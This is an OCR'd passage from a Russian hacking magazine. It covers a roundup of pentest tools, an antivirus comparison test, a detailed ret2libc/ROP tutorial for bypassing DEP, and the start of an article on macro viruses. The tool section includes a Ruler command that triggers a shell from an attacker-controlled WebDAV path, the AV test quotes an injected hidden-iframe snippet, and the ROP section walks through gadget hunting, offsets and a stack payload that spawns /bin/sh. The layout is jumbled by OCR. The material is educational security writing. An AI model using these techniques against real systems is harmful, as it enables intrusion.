                            -usernames ~/users.txt -passwords
                            ~/passwords.txt -delay 0 -v -insecure

                 И пример получения shell:

                        # ./ruler -domain targetdomain.com -email
                            user@targetdomain.com -user username
                            -pass password -loc «\\\\yourserver\\
                            webdav\\shell.bat» -trigger
                            «pop a shell» -rule maliciousrule

                      Более подробно об инструменте можно узнать
                        в блоге авторов инструмента.




               HODOR FUZZER
                       Hodor — это фаззер общего назначения, кото-
                     рый может быть использован и сконфигурирован
                      при известных входных данных с известными раз-
                       делителями для фаззинга определенных мест во
                      входном буфере. По используемым алгоритмам он
                        представляет собой что-то среднее между самым
                        «тупым» и чуть «умным» фаззером при достаточно
                      малых усилиях. Так что если ты хоть немного зна-
                    ешь о файле, протоколе, формате или специфика-
Авторы:                         ции, то уже можно провести более умный фаззинг.NCC Group Plc
                    При этом фаззер разрабатывался как очень порта-
                         тивный, и на целевой машине достаточно наличия
URL:                         только Python 2.7.github.com/nccgroup/hodor
                    Особенности:
                         •  поддержка текстовых и бинарных форматов;
Система:                         •  фаззинг всего файла, определенного диапазонаWindows/Linux
                         данных в файле и данных между определенными
                          разделителями для текстовых форматов;
                         •  мутации: Millerfuzz, Quid Pro Quo (QPQ), TotesRand,
                                BFlipper;
                         •  наличие постмутационных обработчиков (под-
                            счет контрольных сумм);
                         •  выдача результата в stdout, сеть, файл на диск,
                         параметры процесса;
                         •  различные настройки производительности (ите-
                           рации, задержки, потоки и так далее).




                 SWFINTRUDER
                         SWFIntruder  разрабатывался  с  использованием
                             ActionScript, HTML и JavaScript. В итоге получился
                         инструмент, сочетающий в себе лучшие свойства
                          этих языков для анализа flash-файлов. Он загружа-
                          ет SWF-файлы в браузер с различными входными
                     данными и смотрит на появляющиеся в процессе
                       ошибки.
                        Для установки инструмента потребуется локаль-
                     ный веб-сервер с двумя разными hostname. Одно
Авторы:                       для открытия файла, второе — для пейлоадов. Ре-Soroush Dalili
                       комендуется использовать файл crossdomain.xml.
                         Первоначально инструмент разрабатывал Сте-
URL:                     фано ди Паола (Stefano Di Paola). SWFIntruder былgithub.com/irsdl/updated-
                     одним из проектов OWASP, но не поддерживалсяSWFIntruder
                       с 2008 года. Это первый инструмент для тестиро-
                       вания безопасности SWF-файлов непосредственно
Система:                        в браузере, для поиска таких уязвимостей, как XSSWindows
                      и XSF (Cross Site Flashing). Сейчас проект перене-
                       сен на GitHub и вновь развивается, хотя и все еще
                        достаточно сыр.
                      Файл config.js внутри папки js можно изменить
                      и добавить новые векторы атаки.




                 HTCAP
                        Htcap — это сканер веб-приложений, который умеет
                        обходить (crawl) одностраничные приложения (SPA,
                             single page application) рекурсивным способом, пе-
                        рехватывая AJAX-вызовы и изменения DOM. Можно
                           сказать, что htcap — это не просто сканер, поскольку
                      он сосредоточен главным образом на обходе при-
                      ложения и использовании сторонних инструментов
                       для обнаружения уязвимых мест. Может применять-
                        ся как для ручной проверки, так и для автоматиче-Авторы:                        ской при тестах на проникновение современныхsegment-srl
                       веб-приложений.
                         Сканирование разделено на два этапа:URL:                             1. Обход цели и сбор как можно большего числаgithub.com/segment-srl/
                          запросов (URLs, forms, AJAX и другие) и сохра-htcap
                         нение их в БД SQLite.
                             2. Запуск сканеров на запросы, сохраненные в базеСистема:                           данных.Linux

                     А дальше результат сканирования можно просма-
                         тривать с помощью любого просмотрщика SQLite.
                       Пример запуска на обход приложения:

                        $ htcap/htcap.py crawl target_address.local
                            target.db

                      Для запуска необходимо соблюсти несколько зави-
                        симостей:
                         •  Python 2.7;
                         •  PhantomJS v2;
                         •  sqlmap (для sqlmap-модуля сканирования);
                         •  Arachni (для Arachni-модуля сканирования).




                 VULNERS
                       Периодически  возникает  необходимость  быстро
                        проверить Linux-сервер на наличие уязвимостей,
                       при этом нет времени или возможности поставить
                        сканер типа Nexpose или Nessus. В таких случаях нео-
                      ценимую помощь окажет сканер на базе vulners.com.
                         Сканер состоит из двух скриптов на Python.
                            LazyScanner.py  представляет  собой  демон-
                      страцию формата  серверного  API  vulners.com.
                          LinuxScanner.py же больше похож на самостоятель-Авторы:                     ный сканер с опциональным сканированием запу-videns
                     щенных на системе docker-контейнеров. На си-
                       стеме выполняется минимальное число команд:URL:                      определение операционной системы и получениеgithub.com/videns/vulners-
                        списка установленных пакетов. Вся остальная об-scanner
                        работка идет на сервере, а среднее время обра-
                        ботки составляет менее 200 мс. Также энтузиастыСистема:                       написали playbook для системы Ansible, что позво-Windows/Linux
                         ляет производить удаленное сканирование.
                          Проект открытый и активно развивается, так что
                    любые pull requests — welcome.
MALWARE
ТЕСТ БЕСПЛАТНЫХ
                      ЧАСТЬ 5АНТИВИРУСОВ
                                   ТЕСТИРУЕМ ANVI
                                 SMART DEFENDER
                                         FREE, BAIDU ANTIVIRUS,
                                   IMMUNET ANTIVIRUS
       84ckf1r3                         И ZILLYA!
   84ckf1r3@gmail.com





ИНТРО
На заре MS-DOS компьютерных вирусов писалось по нескольку десятков
в год. Сейчас же их клепают сотнями ежедневно, да и сам термин стал собира-
тельным. Теперь это необязательно саморазмножающиеся программы, а лю-
бой код, который сочтут вредоносным. Ирония в том, что антивирусы сами ста-
ли похожи на зловреды. Они все более агрессивно интегрируются в систему,
своевольничают и достают пользователей рекламой, мало от чего защищая.
В этом легко убедиться по материалам наших тестов двадцати бесплатных ан-
тивирусов в прошлых номерах, да и сегодняшняя четверка совсем не выглядит
«великолепной».

МЕТОДИКА ТЕСТИРОВАНИЯ
В прошлых статьях мы невольно сделали рекламу ресурсу Clean MX, в резуль-
тате чего он не перенес бремени свалившейся на него славы и перешел в за-
крытый режим использования. Основатель проекта завален письмами, а где-
то в гигабайтах электронной почты до сих пор лежит и наш запрос на доступ.
Поэтому список угроз на этот раз составлялся из других источников. Основ-
ным стал перечень новых потенциально опасных сайтов от канадского специа-
листа по безопасности Джейсона Лэма (адрес не приводим, чтобы его
веб-страницу не постигла та же участь).
  В остальном методика не изменилась. Каждый ан-
тивирус был установлен в свою виртуальную маши-
ну — клон чистой Windows 10 Pro x86 с последними
обновлениями. Поскольку мы тестировали именно по-
ведение антивирусов, «Защитник Windows» и фильтр
SmartScreen были отключены. Контроль учетных запи-                                                        INFO
сей оставался активным, так как он включен у большин-
ства пользователей и не влияет на работу антивирусов,       Парадоксально, что
выступая в качестве второй линии обороны. Последние      отсутствие антивируса
                                                                      может оказаться
версии бесплатных антивирусов загружались с офици-                                                                          более надежной
альных сайтов и обновлялись непосредственно перед     защитой, чем установка
началом эксперимента.                                                посредственного.
                                                                        Без прикрытия   Все тесты выполнялись по отдельности и моде-                                                                          пользователь действует
лировали поведение рядового пользователя во вре-     осторожнее. Кроме того,
мя веб-серфинга. Браузер Edge открывался на пустой     сторонние антивирусы
                                                                       отключают встроенныйвкладке, после чего в адресную строку вводился URL
                                                                       «Защитник Windows»,
из предварительно отобранного списка вредоносных                                                                      но не всегда дотягивают
сайтов. Далее предпринималась попытка перейти на за-      даже до его уровня.
раженную страницу, результаты протоколировались.

ANVI SMART DEFENDER FREE
Anvi Smart Defender Free v. 2.5.0 — разработка китайской Anvisoft Corporation.
Эта компания появилась на рынке в 2012 году, но до сих пор ее окружает оре-
ол тайны. Аналитик Брайан Кребс утверждает, что штаб-квартира Anvisoft рас-
положена в провинции Сычуань, в то время как ее отдельные сервисы зареги-
стрированы в Канаде и Калифорнии. Брайан предполагает, что за созданием
Anvisoft стоит известный китайский хакер Тан Дайлин (Tan Dailin), входивший
под псевдонимом Withered Rose в организацию NCPH. Считается, что ее нео-
фициально спонсировало правительство Китая при организации атак на сеть
МО США. Ранее команда NCPH специализировалась на уязвимостях нулевого
дня в популярных приложениях. Посмотрим, что за софт получился у ее быв-
шего (?) представителя после легализации бизнеса.





                                                              Anvi устанавливает
                                                    неподписанные драйверы


В описании Anvi Smart Defender Free утверждается, что антивирус использует
два движка. На поверку движок оказался один и тот же, просто разделенный
на локальный и облачный. Размер инсталлятора невелик — 37 Мбайт. Уста-
новка занимает меньше минуты, но во время нее программа требует устано-
вить неподписанные драйверы: asd2fsm.sys; asdids.sys и iaioi2c.sys, чем сразу
настораживает пользователя.





                                                          Anvi — быстрое сканирование

При первом запуске Anvi мы провели рекомендованное быстрое сканирова-
ние, а заодно убрали напоминание о нем. Скан чистой «десятки» завершился
за шесть минут. При этом было проверено 312 тысяч объектов.
  На вкладке с настройками проверки в режиме реального времени по умол-
чанию все компоненты включены. Однако на ней постоянно отображается уве-
домление о неполной защите компьютера. Это такой своеобразный стимул
приобрести платную версию с дополнительными функциями. Пока не купишь
все продукты Anvisoft, защита будет считаться недостаточной.





                                           Дополнительные утилиты от Anvisoft

В разделе «Антихакер» запускается проверка на типичные проблемы на-
строек безопасности. По ее результатам предлагается отключить автозапуск
со съемных носителей, службу удаленного администрирования, удалить соз-
данные по умолчанию общие сетевые ресурсы и так далее. Работает этот ин-
струмент примерно как «Мастер поиска и устранения проблем» в AVZ.





                                                     Модуль Anvi Anti-Hacker

Поскольку мы решили тестировать все антивирусы в одинаковых условиях
и с настройками по умолчанию, то не стали менять эти параметры.
   Здесь планировалось подробно описать результаты каждой проверки,
но писать оказалось нечего. Антивирус провалил все десять тестов. Поскольку
он не смог обнаружить ни одной угрозы, мы не будем приводить дюжину одно-
типных скриншотов, а ограничимся наиболее показательными.





                     Anvi игнорирует загрузку вредоносного скрипта со стороннего сайта


В общей сложности Anvi пропустил шесть троянов разных типов, не определил
начало загрузки вредоносных файлов, не увидел на сайтах веб-инжекты в за-
раженных иконках favicon.ico, гифках и файлах JPEG, а также не распознал при-
знаки фишинга. Активного заражения системы не произошло, но это уже заслу-
га Edge. Логи Anvi Smart Defender Free остались девственно чистыми. Мы даже
запустили повторное полное сканирование системы, давая ему шанс реабили-
тироваться. На этот раз оно заняло 53 минуты. Было проверено 413 тысяч фай-
лов, но количество обнаруженных зловредов по-прежнему осталось нулевым.





                          Anvi — полное сканирование после десяти проваленных тестов


Результат: 0 из 10. Ломать у Тан Дайлина явно получалось лучше, чем строить.

BAIDU ANTIVIRUS 2015 FREE
Дистрибутив другого китайского антивируса занимает 27 Мбайт. Установка длит-
ся всего полминуты. В ходе инсталляции сразу же предлагается присоединиться
к программе улучшения качества и выбрать язык, но русского в списке нет.





                                                     Байду не жалует русских

Перед началом тестирования мы выполнили обновление и быструю проверку,
которая заняла без малого пять минут. При этом было просканировано при-
мерно четыре тысячи объектов файловой системы.





                                                     Baidu — быстрое сканирование

Интерфейс довольно наглядный. На вкладке ToolBox можно найти плагины,
виджеты и дополнительные инструменты защиты. Мы не стали их использо-
вать, чтобы не нарушать чистоту эксперимента. Перед тестами были включе-
ны только основные компоненты защиты, в том числе антивирусный монитор
и защита от интернет-угроз.





                                            Дополнительные компоненты Baidu

Нам бы хотелось написать подробнее, но снова оказалось не о чем. Антивирус
Baidu оправдал свое название. Как и предыдущий участник тестов, он не рас-
познал ни одной угрозы — даже несмотря на наличие отдельных инструментов
для защиты от фишинга и вредоносных загрузок. Ни один из компонентов ан-
тивируса не сработал ни разу. Baidu Antivirus не определял зловредов на сай-
тах ни по сигнатурному, ни по поведенческому, ни по репутационному анали-
зу — вообще никак.





                                                 Baidu игнорирует зараженные сайты

Полная проверка после завершения тестов длилась больше полутора часов,
но также ничего не дала. Результат: 0 из 10.



                           Продолжение статьи
MALWARE
ТЕСТНачало статьи БЕСПЛАТНЫХ
                      ЧАСТЬ 5АНТИВИРУСОВ
ТЕСТИРУЕМ ANVI SMART DEFENDER FREE,
BAIDU ANTIVIRUS, IMMUNET ANTIVIRUS И ZILLYA!



IMMUNET ANTIVIRUS 5.0.2
Облачный антивирус Immunet был разработан Cisco.
Он устанавливается в ОС Windows XP — 10 любой
разрядности и может работать совместно с други-
ми антивирусами. Опционально к нему подключается
движок ClamAV, который мы уже тестировали в соста-
ве Clam Sentinel.                                              WARNING
   Крошечный веб-инсталлятор размером в полме-
                                                                   Списки вредоносных сайтовгабайта скачивает 16 Мбайт установочных файлов.
                                                                были получены из открытых
После установки антивирус занимает 42 Мбайт. Сра-                                                                          источников. Все тесты выпол-
зу предлагается выполнить быстрое сканирование,     нялись в исследовательских
на которое мы по традиции соглашаемся. По умол-       целях. Они моделировали
                                                                           только защиту от веб-угрозчанию отключены средства проверки ClamAV, а также                                                                   и не могут использоваться
сканирование архивов и упакованных исполняемых       для оценки эффективно-
файлов. Это странная политика, но условия тестиро-       сти антивирусов в других
                                                                        сценариях. Автор и редакциявания для всех должны быть одинаковы: используем                                                                      не несут ответственности
настройки по умолчанию.                                                                          за любые последствия по-
   Трудно поверить, но и этот антивирус провалил      лученной из данной статьи
все тесты. Забавно, что на фишинговой странице нам           информации.
показали занимательную статистику, которая по сти-
лю была похожа на рекламу внутри самого Immunet —
в нем тоже приводятся внушительные цифры, взятые
с потолка.





                          Immunet: 22,5 миллиона людей из 7,46 миллиарда защищены

Шесть лет назад редакция PCMag протестировала вторую версию этого анти-
вируса и сформулировала свой вывод мягко: «Фактическое количество забло-
кированных установок [вредоносного ПО] было близко к 40 процентам... Это
дополнительное средство, и компания не рекомендует использовать Immunet
Free как единственную антивирусную защиту». Сейчас же мы не рекомендуем
его использовать вовсе. Результат: 0 из 10.

ZILLYA!
В отличие от Immunet, украинский антивирус Zillya! v. 2.0.1075 от ALLIT Service
позиционируется как самодостаточное средство защиты. Он сразу требует
удалить из системы другие антивирусы. Это обычная практика предотвраще-
ния конфликтов между компонентами защиты в реальном времени от разных
производителей, но стоит убедиться в равноценности замены. При разме-
ре дистрибутива 87 Мбайт Zillya! устанавливается быстро — секунд за сорок.
Обещалось, что антивирус не будет показывать рекламу, но именно ее мы
смотрели сразу после инсталляции в принудительно открытом окне браузера.
Предварительный выбор русского языка не повлиял на рекламный текст — он
отображался на украинском.





                                         Ще не вмерли віруси!

Обновление антивирусных баз выполнялось гораздо дольше, чем установ-
ка программы. Настройки мы оставили по умолчанию за исключением одного
пункта: режим оповещений выставили на максимум для удобства наблюдения
за реакцией антивируса.





                                                  Максимальное оповещение


Как вскоре выяснилось — зря. Никакой реакции не было. Снова десять тестов
из десяти были провалены.





                                                   Хто не скаче — не троянський кінь!
Результат: 0 из 10.

ВЫВОДЫ
Итоговый результат напоминает метаадрес: 0.0.0.0. Впервые антивирусы про-
пустили абсолютно все тестовые угрозы. При этом даже невооруженным гла-
зом мы видели редиректы, загрузку фишинговых страниц и такое, что лучше
не видеть. Может, во время тестов сайты уже вылечили? Снова проверяем
отобранные ссылки. VirusTotal даже увеличивает число срабатываний.





                                           Статистика VirusTotal по четвертому тесту

Сканер Sucuri показывает скрытые фреймы и загрузку вредоносных джа-
ва-скриптов.





                                    Отчет Sucuri о зараженной странице из теста № 5


Анализатор  Quttera  находит до восемнадцати инфицированных файлов
на сайтах из списка.





                              18 инфицированных файлов на веб-странице из теста № 7


На гифки с сайта в шестом тесте реагирует даже «Защитник Windows», если
его включить.





                              Даже Windows Defender видит зараженную гифку

В них используется интересный механизм сокрытия вре-
доносного кода. При открытии сайта загружается кнопка
equal.gif и другие гифки, содержащие инжект джава-скрип-
та. Скрипт последовательно перенаправляет браузер
на другие зараженные веб-страницы через iframes. При-
мер кода ниже:
                                                 DANGER
<iframe src="http://www.[infected_site]/
                                                                        Заражение редко    [infected.page]" width=0 height=0></iframe>                                                                               удается распознать
<?ob_start()?><iframe src="[infected_site]/              по внешним признакам.
    [infected.page]" width=0 height=0></iframe>         Многие бэкдоры внедря-
                                                                        ются скрытно и так же
                                                                          незаметно действуют,
Как видишь, угрозы были подобраны вполне реальные,                                                                       успешно обманывая
и на момент проверки все они были актуальны. Просто ни-   антивирусные сканеры.
кто из участников сегодняшнего тестирования не заметил    Даже если антивирус
                                                                         определил и заблоки-их в упор. Мы не искали зубастых зловредов и не создава-                                                                          ровал какую-то угрозу,
ли какой-то особой ситуации — наоборот, имитировали   нет гарантии, что другая
обычный веб-серфинг на новом компьютере. Именно     в это же время не по-
                                                                              лучила контроль надс защитой от веб-угроз участники сегодняшнего теста                                                                                 системой.
не справились.
   Возможно, они среагировали бы на уже проникших
в систему зловредов, но активного заражения не проис-
ходило. В одних случаях при загрузке инфицированной
веб-страницы возникала ошибка выполнения сценария,
а в других просто отсутствовали нужные троянам уязви-
мые компоненты.
   Вопрос о том, как именно защитные программы долж-
                                   WWW
ны реагировать на веб-угрозы, всегда был спорным.
Отмечу лишь,  что антивирусы  от  Fortinet,  Kaspersky,           Anvi Smart
Sophos, Symantec и многие другие действуют иначе —        Defender Free
с акцентом на превентивные меры. Они проверяют ре-                                                                                  Baidu Antivirus
путацию сайта еще до перехода пользователя на него,         2015 Free
а затем сканируют весь код веб-страницы до ее переда-
                                                                           Immunet AntiVirusчи браузеру. В случае опасности они просто заменяют                                                                                          Free
ее своей заглушкой. Если же вместо превентивного ал-
горитма использовать реактивный (не в смысле быстрый,         Zillya! Антивирус
а срабатывающий при попытке заражения), то мы полу-        бесплатный
чим вот таких подслеповатых сторожей. Каких-то троянов
они смогут остановить, а каких-то не распознают. Проще
не давать пользователю самой возможности «выстрелить себе в ногу».
 MALWARE
НАСАЖИВАЕМНАСАЖИВАЕМНАСАЖИВАЕМНАСАЖИВАЕМНАСАЖИВАЕМНАСАЖИВАЕМНАСАЖИВАЕМНАСАЖИВАЕМНАСАЖИВАЕМ
DEPDEPDEPDEPDEPDEPDEPDEPDEP





RET2LIBC И ROP-ЦЕПОЧКИ
ПРОТИВ DATA EXECUTION
PREVENTION





 В прошлой статье мы с тобой начали погру-
 жаться в мир шелл-кодинга для 64-битных
 *nix-систем. Пора развить эту тенденцию,
 ведь это журнал «Хакер»! Сегодня мы напи-
 шем эксплоит для обхода технологии DEP.          simonuvarov@gmail.comСемён Уваров
 Для этого рассмотрим две техники: ret2libc и
 ROP-цепочки.

 ИНСТРУМЕНТАРИЙ
 Сегодня нам понадобятся:
 1. Python Exploit Development Assistence for GDP.
 2. Radare2.
 3. GDB.

 Для демонстрации уязвимости напишем простую программу на C:





 Компилируем ее:

 # gcc -fno-stack-protector rop.c -o rop

 Так как обход ASLR — тема отдельной статьи, то временно отключаем его ко-
 мандой

 # echo 0 > /proc/sys/kernel/randomize_va_space

 Чтобы проверить, действительно ли ASLR отключен, введем команду ldd
 <путь_к_исполняемому_файлу>. Должны получить что-то вроде

 linux-vdso.so.1 (0x00007ffff7ffa000)
 libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7a3c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dda000)

 Если еще раз ввести команду, то адреса останутся такими же (указаны в скобках).

 Коротко о DEP

 В прошлой статье мы намеренно отключили DEP, чтобы можно было запустить
 наш шелл-код. Сегодня мы так делать не будем, а вместо этого попробуем его
 обойти.
   DEP работает следующим образом: память, которая не должна исполнять-
 ся (например, стек), помечается специальным битом NX. Если ты попробуешь
 запустить код из памяти с установленным битом NX, то вызовется исключение.
 Это не позволяет использовать эксплоиты, которые просто передают управле-
 ние на шелл-код. Для обхода DEP/NX и существуют крутые техники, такие как
 return-oriented programming (кстати, почитай на досуге кое-что из нашего ста-
 ренького: тыц и дыц. — Прим. ред.) и ret2libc. Более подробно о них расскажу
 чуть ниже.



 Твой первый ROP или ret2libc
 В классическом 32-битном случае ret2libc требует создания фейкового стека
 со всеми необходимыми параметрами для вызова функции из libc. Например,
 можно вызвать функцию system() и передать ей строку /bin/sh.
    Как ты помнишь из предыдущей статьи, в 64-битной системе первые шесть
 параметров передаются через регистры rdi, rsi, rdx, rcx, r8 и r9. Все
 остальные параметры передаются через стек. Таким образом, для того чтобы
 вызвать функцию из libc, нам сначала необходимо присвоить регистрам нуж-
 ные значения. Для этого мы и будем использовать ROP.
   ROP (return-oriented programming) — это технология, которая позволяет
 обходить NX-бит. Идея ROP-цепочек довольно проста. Вместо того чтобы за-
 писывать и исполнять код на стеке, мы будем использовать так называемые
 гаджеты.
    Гаджет — это короткая последовательность команд, которые заканчивают-
 ся инструкцией ret. Комбинируя такие команды, мы можем добиться исполне-
 ния кода.
   При помощи гаджетов мы можем:
 •  записывать константу в регистр, например pop rax; ret;;
 •  брать значение из памяти и записывать в регистр, например mov [rax],
    rcx; ret;;
 •  копировать значение в память, например mov rbx, [rcx]; ret;;
 •  выполнять различные арифметические операции, например xor rax, rax;
    ret;;
 •  делать syscall.

 Наш эксплоит будет сравнительно простым. Он будет вызывать system('/
 bin/sh'). Для этого нам необходимо узнать:
 •  адрес функции system(). Мы отключили ASLR, таким образом, он не будет
    меняться при перезапуске;
 •  адрес строки '/bin/sh' в памяти (или, другими словами, указатель на строку);
 •  адрес ROP-гаджета, который скопирует адрес строки '/bin/sh' в регистр rdi
    (через него передается первый параметр функции);
 •  номер байта, после записи которого начинает перезаписываться регистр rip.

 Для того чтобы найти адрес функции system(), воспользуемся отладчиком
 GDB — введем gdb rop.
 Затем запустим нашу программу:

 gdb-peda$ start

 Получим адрес функции system():

 gdb-peda$ p system
 $1 = {<text variable, no debug info>} 0x7ffff7a7b4d0 <system>

 Получим указатель на строку '/bin/sh':

 gdb-peda$ find '/bin/sh'
 Searching for '/bin/sh' in: None ranges
 Found 1 results, display max 1 items:
 libc : 0x7ffff7b9d359 --> 0x68732f6e69622f ('/bin/sh')

 Записываем полученные адреса на листочек или в блокнот (у тебя они мо-
 гут отличаться). Теперь нам нужен гаджет, который скопирует значение
 0x7ffff7b9d359 в регистр rdi. Для этого воспользуемся radare2. Запускаем
 r2 rop и затем ищем нужный гаджет:

 [0x00400400]> /R pop rdi
     0x004005a3                 5f  pop rdi
     0x004005a4                 c3  ret

 Этот гаджет нам подходит. Он возьмет значение из стека и запишет его в ре-
 гистр rdi. Сохрани его адрес.
    Осталось узнать, сколько надо записать «мусора» перед нашим эксплои-
 том, чтобы управление передалось по правильному адресу. Для этого созда-
 дим паттерн длиной 400 символов и запишем его в файл pattern.txt:

 gdb-peda$ pattern_create 400 pattern.txt
 Writing pattern of 400 chars to filename "pattern.txt"

 Теперь запустим в GDB нашу уязвимую программу и подадим ей на вход полу-
 ченный паттерн:

 gdb-peda$ r < pattern.txt

 Мы получим ошибку «Program received signal SIGSEGV, Segmentation fault». Нам
 необходимо посмотреть значение, на которое указывает регистр RSP. В моем
 случае это выглядит как:

 RSP: 0x7fffffffe028 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA
 %7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA
 %VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y\020\341\377\367\377\177")

 Регистр rip указывает на команду ret;, то есть дальше процессор возьмет
 адрес со стека и передаст на него управление. Именно этот адрес нам надо
 заменить на адрес нашего гаджета.
   Возьмем первые 6 байт (например), в моем случае это HA%dA%. Затем
 определим, по какому смещению находятся эти байты в нашем паттерне:

 gdb-peda$ pattern offset HA%dA%
 HA%dA% found at offset: 264

 Таким образом, получили, что нам нужно сначала перезаписать 264 байта,
 чтобы добраться до rip.
    Теперь у тебя есть все, чтобы написать свой первый эксплоит:





 Данный код делает следующее:
 1. Создает буфер и записывает туда 264 буквы А.
 2. Записывает адрес гаджета pop rdi; ret;.
 3. Записывает адрес строки /bin/sh, который является аргументом для функ-
    ции system().
 4. Записывает адрес функции system().

 Теперь разберемся, что происходит со стеком во время работы. Сначала мы
 попадаем на наш гаджет (потому что мы перезаписали адрес возврата). Затем
 первая команда гаджета (pop rdi) берет со стека значение указателя на '/bin/
 sh' и записывает его в регистр rdi. После этого выполняется вторая коман-
 да гаджета — ret, которая берет следующее значение со стека (адрес функ-
 ции system()) и «прыгает» на него. В конце всего этого выполняется функция
 system(), входное значение которой передано в регистре rip.
    Теперь вызовем наш скрипт, который сгенерирует файл exploit.txt. Затем
 пробуем вызывать нашу программу и на вход ей подаем файл exploit.txt:

 $ (cat exploit.txt; cat) | ./rop

 После чего появится мигающий курсор оболочки sh. В данном случае мы ис-
 пользовали всего один гаджет, теперь попробуем разобраться, что делать,
 если их несколько.

 Связываем цепочки
 Вся сила ROP в том, что мы можем соединять гаджеты в цепочки или так назы-
 ваемые ROP chains. Для этого нам надо расположить на стеке адреса гадже-
 тов в последовательном порядке. Так как каждый гаджет закачивается коман-
 дой ret, он будет брать адрес следующего гаджета со стека и передавать на
 него управление.
    Чтобы выполнить произвольный код и перейти к интерпретатору sh, вос-
 пользуемся алгоритмом из прошлой статьи — будем использовать функцию
 execve():
 1. Положим в rdi адрес строки '/bin/sh' (содержит путь до файла, который мы
    будем запускать).
 2. Обнулим rsi, чтобы не возиться с указателями на указатели (содержит ука-
    затель на массив строк argv).
 3. Обнулим регистр rdx, который содержит указатель envp.
 4. Запишем номер функции (0x3b) в регистр rax.
 5. Выполним syscall.

 Осталось найти гаджеты, которые выполнят указанные действия.
    Адрес гаджета pop rdi; ret; мы уже получили, когда писали эксплоит aka
 ret2libc.
    Теперь ищем гаджет, который сможет записать значение в регистр rsi.
 Опять открываем radare2 и вводим:

 [0x00400400]> /R pop rsi
     0x004005a1                 5e  pop rsi
     0x004005a2               415f  pop r15
     0x004005a4                 c3  ret

 Отлично. Этот гаджет нам подходит. Ты, наверное, заметил, что он затрагива-
 ет также регистр r15. Это не проблема — мы просто положим туда случайное
 значение (неважно какое), которое запишется в регистр r15. В противном слу-
 чае команда pop r15 возьмет адрес следующего гаджета и сломает наш экс-
 плоит.
    Некоторые гаджеты могут отсутствовать в нашем исполняемом файле, но
 мы можем использовать библиотеки, которые они подгружают. Чтобы посмо-
 треть, какие библиотеки используются, делаем:

 $ ldd rop
 linux-vdso.so.1 (0x00007ffff7ffa000)
 libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7a3c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dda000)

 И сразу запоминаем адрес загрузки библиотеки libc, он еще пригодится.
    Открываем библиотеку в radare2:

 r2 /usr/lib/libc.so.6

 И затем ищем гаджет, с помощью которого мы сможем записать значение в
 регистр rax:

 [0x000203b0]> /R pop rax
     0x0011ec71               8903  mov dword [rbx], eax
     0x0011ec73                 58  pop rax
     0x0011ec74                 5a  pop rdx
     0x0011ec75                 5b  pop rbx
     0x0011ec76                 c3  ret

 Их будет много, но нам хватит и одного. Кроме того что этот гаджет может за-
 писать значение в регистр rax, он позволяет записать значение еще в два ре-
 гистра. Нас интересует регистр rdx, который хранит адрес envp при вызове
 функции execve(). Как мы уже сказали, мы запишем в него null, с регистром
 rbx делаем то же самое, что и с r15 на предыдущем шаге, — кладем туда слу-
 чайное значение, чтобы не сломать эксплоит.
    Так как этот адрес есть, по сути, смещение гаджета в библиотеке libc, то
 для того, чтобы получить его реальный адрес, мы складываем адрес смеще-
 ния гаджета и базовый адрес библиотеки:

 >>> hex(0x0011ec73 + 0x7ffff7a3c000)
 '0x7ffff7b5ac73'

 И получаем 0x7ffff7b5ac73 — реальный адрес гаджета.
 Теперь найдем гаджет, с помощью которого мы сможем вызвать syscall:

 [0x000203b0]> /R syscall
     0x0010248e               0000  add byte [rax], al
     0x00102490             48633f  movsxd rdi, dword [rdi]
     0x00102493         b803000000  mov eax, 3
     0x00102498               0f05  syscall
     0x0010249a                 c3  ret

 Прибавляем к адресу гаджета базовый адрес библиотеки libc и получаем
 0x7ffff7b3e498 — адрес гаджета syscall.
    Теперь осталось собрать все это и сформировать буфер для эксплоита. Он
 будет выглядеть так:

 0x004005a3       указатель на гаджет `pop rdi; ret;`
 0x7ffff7b9d359   указатель на строку '/bin/sh'
 0x004005a1       указатель на гаджет `pop rsi; ret;`
 0x0              null (значение `argv`)
 0xffffdeadbeef   случайное значение (чтобы отработал `pop r15;`)
 0x7ffff7b5ac73   указатель на гаджет `pop rax; ret`
 0x3b             номер функции execve для syscall
 0x0              null (значение `envp`)
 0xffffffffabcd   случайное значение (чтобы отработал `pop rbx;`)
 0x7ffff7b3e498   syscall

 Пишем небольшой скрипт, который сформирует буфер и запишет его в файл:





 Запускаем скрипт и получаем на выходе файл exploit.txt. Теперь подаем его на
 вход нашей программе:

 (cat exploit.txt; cat) | ./rop

 Теперь мы внутри sh. Если мы хотим получить полноценный
 шелл, можем сделать это при помощи python:

 python -c 'import pty; pty.spawn("/bin/sh")'

 После чего появится «красивый» шелл sh :).                                    WWW
 To be continued...                                                    Таблица вызовов
 Недавно Intel представила предварительную спецификацию            syscall
 новой технологии защиты от эксплоитов. Данная техноло-                                                                                   Radare2 —
 гия, которая называется Control-flow Enforcement Technology     фреймворк для
 (CET), представляет модель защиты от эксплоитов, которые     реверс-инжини-
                                                                                     ринга так или иначе используют ROP. Обо всех деталях уже дав-
 но написано в интернете. Но мы же с тобой понимаем, что                                                                         PEDA —
 мир ИБ — это противостояние меча и щита и на новые тех-       Python Exploit
 ники защиты обязательно появятся новые техники нападе-       Development
                                                                                          Assistance for
 ния, о которых мы непременно тебе расскажем на страницах                                                                  GDB
 журнала.
MALWARE
ВОЗВРАЩЕНИЕ
МАКРОВИРУСА





КАК ПОТОМКИ СТАРЫХ
УГРОЗ НАПРЯГАЮТ
ПОЛЬЗОВАТЕЛЕЙ В 2016-М



 Бытует мнение, что макровирусами, в де-
 вяностые бывшими настоящим бичом ком-
пьютерного мира, в наше время разве что
                                                                            Кирилл Кожевников
                                                                                                   Dr.Web пугают новичков у костра в День сисадмина.
 Действительно, есть чего испугаться — офи-
сные документы, при открытии исполняющие код на VBA!
К сожалению, сейчас вредоносные макросы переживают
настоящий ренессанс.

НЕМНОГО ИСТОРИИ
 В 1999 году интернет запестрел жалобами на макровирус под Microsoft Word
 97 и 2000, самораспространяющийся по электронной почте и заражающий
 компьютеры. Так миру явилась знаменитая «Мелисса» — макрос делал мно-
 го чего, включая манипуляции с реестром и заражение стандартного шабло-
 на документа Word, но в итоге при соблюдении ряда условий просто оставлял
